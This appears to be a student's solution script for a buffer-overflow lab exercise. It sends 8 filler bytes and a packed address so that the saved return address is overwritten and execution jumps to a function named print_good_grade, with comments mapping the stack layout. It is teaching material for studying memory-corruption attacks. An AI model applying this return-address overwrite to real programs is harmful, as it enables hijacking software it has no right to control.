#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
# starting address of print_good_grade: 0x080488bc
# input[] sotred at %ebp -4 (0xfffef5ac)
#   	Lower
#	INPUT[]
#	%ebp
#	RET
#    	Higher
# so override 12 bytes
# RET is at (0xfffef5b0+4) = 0xfffef5b4
# override RET to 0x80488bc
string = b"A"*4 + b"B"*4 + pack("<I",0x80488bc) # override input and %ebp and override ret to start address of print_good_grade

sys.stdout.buffer.write(string)

